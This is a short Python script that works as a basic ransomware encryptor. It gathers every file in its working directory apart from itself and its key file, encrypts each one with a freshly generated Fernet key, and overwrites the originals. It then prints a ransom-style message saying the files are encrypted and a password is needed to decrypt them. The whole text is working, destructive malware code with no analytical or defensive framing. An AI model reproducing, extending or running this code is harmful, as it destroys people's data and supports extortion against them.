import os
from cryptography.fernet import Fernet

files = []
# ========================================================= #
# -Grab file in current directory and append to a list      #
# -Filtering python files, created files, and folders       #
# ========================================================= #
for file in os.listdir():
    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)
print(f"These files will be encrypted: {files}")

# ========================================================= #
#       Generate an encryption key using Fernet             #
# ========================================================= #
key = Fernet.generate_key()

# ========================================================= #
#       Put the encryption key in a .key file               #
# ========================================================= #
with open("key.key", "wb") as thekey:
    thekey.write(key)

# ========================================================= #
#  Encrypting files and write back encryption in each file  #
# ========================================================= #
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)  # encrypting the contents generated for each file
    with open(file, "wb") as f:
        f.write(contents_encrypted)                     # write it back as an encrypted file

print("All of your files are encrypted! You will need a password to decrypt. ")
